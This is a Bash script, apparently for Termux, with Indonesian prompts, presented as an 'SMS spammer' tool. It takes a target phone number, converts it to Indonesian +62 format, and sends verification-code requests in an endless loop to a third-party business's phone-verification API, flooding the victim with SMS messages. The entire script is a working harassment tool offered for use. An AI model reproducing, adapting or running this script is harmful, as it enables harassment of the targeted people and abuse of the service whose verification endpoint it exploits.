b="\033[34;1m"
 p="\033[39;1m"
  k="\033[33;1m"
   m="\033[31;1m"
    h="\033[32;1m"
     c="\033[35;1m"
      pu="\033[36;1m"
       x="\033[30;1m"
        o="\033[0m"
        JAM=`date +%H`
          MENIT=`date +%M`
            DETIK=`date +%S`
             TANGGAL=`date +%d`
           BULAN=`date +%m`
        TAHUN=`date +%Y`
        
        load(){
        printf "\t ${p}[${c}•${p}]${pu}Proses Spaming${h}"
        sleep 0.5
        printf "."
        sleep 0.5
        printf "."
        sleep 0.5
        printf "."
        sleep 0.5
        printf ".\n"
        }

function check(){
		if [ -z $(command -v curl) ];then
		printf "${p}[${m}!${p}]${m}curl belum di install!!\n"
		printf "${p}[${m}!${p}]${h}pkg install curl\n"
		printf "${p}[${m}!${p}]${m}Silahkan Install dulu\n"
		exit
		fi
		
		if [ -z $(command -v bash) ];then
		printf "${p}[${m}!${p}]${m}bash belum di install!!\n"
		printf "${p}[${m}!${p}]${h}pkg install bash\n"
		printf "${p}[${m}!${p}]${m}Silahkan Install dulu\n"
		exit
		fi
		
}
check
clear
echo -e "\t${p}__________________________"
echo -e "\t${h}|   ✓ SPAMER SMS 2022 ✓   |"
echo -e "\t${p}| ✓  Author${m}: ${x}RIZQIMBMBG ✓ |"
echo -e "\t${p}| ✓ Team${m}: ${p,}WHITERS INDOK ✓ |"
echo -e "\t${p}__________________________"
echo -e "\t${m}    { ${x}+++TOLS SPAM+++ ${m}} \n"
function spam(){
for (( loop = 1; loop <= loop; loop++ ));do
	get=$( curl -s --http2 -X POST \
	-H "accept:application/json, text/plain, */*" \
	-H "authorization:undefined" \
	-H "save-data:on" \
	-H "user-agent:Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36" \
	-H "content-type:application/json;charset=UTF-8" -d '{"phone_number":"'"$number"'"}' "https://service.mokapos.com/account/v1/verification/phone/send" | grep -Eo -i "ok" | tr "OK" "rus" | awk {'print $1"s"'})
	
	if [[ $get =~ "rus" ]];then
	printf "${p}[${h}•${p}] Spaming Sms To ${pu}$number ${m}[${h} Berhasil ${m}]\n"
	fi
done
}

function __main__(){
	printf "\t${b}╔════════════════════════╗ \n"
    printf "\t${b}║${p}TARGET===>>${m}:${pu} " number
    read number;
    printf "\t${b}╚════════════════════════╝\n"    
  	ko=$(echo -e "$number" | grep -Eo "7166")
  	kop=$(echo -e "$number" | grep -Eo "7622")
  	if [[ ${ko} =~ "7166" ]];then
  		echo -e "\t${p}[${m}!${p}] ${k}GASS SPAM ${m}!!\n"
  		exit
  	elif [[ ${number} =~ "7622" ]];then
  		echo -e "\t${p}[${m}!${p}] ${k}GASINN ${m}!!\n"
  		exit
  	fi
    if [[ ${number:0:2} =~ "0" ]]; then
    printf "\t   ${m}*${x}ctrl + c untuk exit${m}*\n"
    number="+62${number:1:15}"
    spam $number
    elif [[ ${number:0:2} =~ "62" ]]; then
    printf "\t   ${m}*${x}ctrl + c untuk exit${m}*\n"
    number="+${number:0:15}"
    spam $number
    elif [[ ${number:0:3} =~ "+62" ]]; then
    printf "\t   ${m}*${x}ctrl + c untuk exit${m}*\n"
    number="$number"
    spam $number
    else 
    printf "\t${p}[${m}!${p}] ${m}Invalid Number!!\n\n"
    exit 1
    fi
}
__main__
